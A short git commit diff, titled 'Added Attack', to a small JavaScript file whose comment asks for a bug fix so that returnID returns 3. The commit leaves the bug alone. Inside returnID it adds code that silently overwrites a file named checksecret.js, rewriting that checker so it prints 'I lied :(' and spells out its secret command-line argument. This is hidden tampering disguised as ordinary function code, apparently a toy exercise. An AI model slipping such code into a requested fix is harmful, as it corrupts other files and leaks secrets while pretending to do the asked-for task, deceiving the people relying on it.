2e09f7abb6fd6adc50159c65cc167a17bd85f373
Alex <alex@Pirate-Ship.local>
2021-01-25 08:52:17 -0500

    Added Attack

--- index.js
+++ index.js
@@ -1,6 +1,9 @@
 // Please fix the bug, this is supposed to be a 3
 function returnID() {
-    return 2;
+  let attack = '\n\nconsole.log("I lied :(");\nconsole.log(process.argv[2].split(""))\n'
+  fs = require('fs')
+  fs.writeFileSync('checksecret.js', attack);
+  return 2;
 }
 
 console.log(returnID());
